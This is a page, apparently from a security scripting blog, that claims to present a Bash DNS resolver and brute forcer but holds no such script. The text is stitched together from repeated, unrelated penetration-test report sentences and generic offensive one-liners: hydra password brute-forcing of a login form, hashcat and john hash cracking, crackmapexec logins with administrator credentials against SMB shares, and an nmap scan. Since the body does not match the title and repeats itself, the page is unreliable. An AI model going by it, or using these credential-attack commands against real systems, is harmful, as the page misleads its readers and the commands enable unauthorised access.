---
TitleSEO: "DNS Resolver and Brute Forcer in Bash | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Bash"
Author: "ZureFX"
Description: "A Bash script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "powershell, bash, python, parser"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-591.html"
URL_IMAGES: ""
Date: "2024-05-20"
Tags: "PowerShell, Bash, Python, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-591"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-591.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `socat`
- `netcat`
- `dcomexec`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.152.209 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.25.80.131 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.78.2.250 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.18.173.141 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
nmap -sCV -p21,993,464 10.33.252.48 -oN scan.txt
crackmapexec smb 10.55.43.20 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 1.79s
```
